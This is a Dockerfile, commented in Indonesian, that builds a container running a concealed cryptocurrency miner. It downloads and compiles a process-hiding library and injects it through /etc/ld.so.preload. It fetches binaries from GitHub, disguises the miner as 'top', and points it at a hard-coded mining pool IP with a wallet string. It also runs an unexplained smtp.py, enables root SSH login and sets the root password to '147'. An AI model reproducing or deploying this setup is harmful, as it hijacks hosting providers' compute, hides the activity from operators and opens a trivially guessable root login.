FROM debian

ENV DEBIAN_FRONTEND=noninteractive

# Memperbarui sistem dan menginstal paket yang diperlukan
RUN apt update && apt upgrade -y && apt install -y \
    ssh git wget tmate gcc python3

# Mengunduh dan mengompilasi process hider
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Mengunduh, mengompilasi, dan memindahkan biner hi
RUN mkdir -p /run/sshd \
    && wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c \
    && gcc -o hi hi.c \
    && chmod +x hi \
    && mv hi /run/sshd/ \
    && rm hi.c

# Mengunduh dan memindahkan file bhmax
RUN wget https://github.com/hudahadoh/hime/raw/main/bhmax \
    && chmod +x bhmax \
    && mv bhmax /run/sshd/    

# Mengunduh dan memindahkan file smtp.py
RUN wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py \
    && mv smtp.py /run/sshd/

# Mengatur skrip openssh.sh dan konfigurasi SSH
RUN echo "sleep 5" >> /openssh.sh \
    && echo "/run/sshd/hi -s "/usr/bin/top" -d -p test.pid ./run/sshd/bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.xd1 --pass x -k -t 3 --randomx-mode auto --randomx-wrmsr=-1 --randomx-no-rdmsr --randomx-no-numa &" >> /openssh.sh \
    && echo "python3 /run/sshd/smtp.py &" >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >> /openssh.sh \
    && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
    && echo root:147 | chpasswd \
    && chmod 755 /openssh.sh

# Menentukan perintah yang akan dijalankan saat container dimulai
CMD /openssh.sh
